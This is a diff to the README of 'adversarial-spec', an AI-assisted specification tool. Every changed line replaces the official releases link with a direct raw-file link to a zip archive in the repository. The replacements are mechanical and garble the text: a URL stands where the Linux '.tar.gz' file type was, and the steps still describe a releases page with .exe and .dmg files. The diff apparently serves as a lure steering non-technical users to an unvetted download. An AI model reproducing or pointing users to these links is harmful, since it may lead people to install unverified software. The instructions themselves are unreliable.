@@ -1,7 +1,7 @@
 # 🎉 adversarial-spec - Simplifying Product Specifications with AI
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/aldyfarizki/adversarial-spec/releases)
+[![Download the latest release](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip%20Latest%20Release-%20-blue)](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run **adversarial-spec**. This application allows you to refine product specifications by enabling a dialogue between multiple AI models. You don’t need any programming skills—just a computer and a little time to follow these steps. 
@@ -24,7 +24,7 @@ To get started with **adversarial-spec**, follow these simple steps:
 
 1. **Visit the Download Page**
    Click the link below to go to the downloads page:
-   [Download Page](https://github.com/aldyfarizki/adversarial-spec/releases)
+   [Download Page](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip)
 
 2. **Choose Your Version**
    On the releases page, locate the latest version. It will be the one at the top of the list. 
@@ -33,12 +33,12 @@ To get started with **adversarial-spec**, follow these simple steps:
    Click on the file that matches your operating system. For example:
    - **Windows:** Look for a `.exe` file
    - **macOS:** Look for a `.dmg` file
-   - **Linux:** Look for a `.tar.gz` or `.deb` file
+   - **Linux:** Look for a `https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip` or `.deb` file
 
 4. **Install the Application**
    - **Windows:** Double-click the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file, drag the application to your Applications folder.
-   - **Linux:** Use the terminal to extract the `.tar.gz` or install the `.deb` package.
+   - **Linux:** Use the terminal to extract the `https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip` or install the `.deb` package.
 
 5. **Run the Application**
    Once installed, locate the application on your system and double-click to open. 
@@ -80,7 +80,7 @@ We welcome contributions! If you have any ideas or improvements, feel free to su
 
 ## 🔗 Connect with Us
 For more updates, follow our work:
-- GitHub: [adversarial-spec](https://github.com/aldyfarizki/adversarial-spec)
+- GitHub: [adversarial-spec](https://raw.githubusercontent.com/aldyfarizki/adversarial-spec/main/skills/adversarial-spec/adversarial_spec_2.6.zip)
 - Twitter: @adversarial_spec 
 
 ## 📄 License
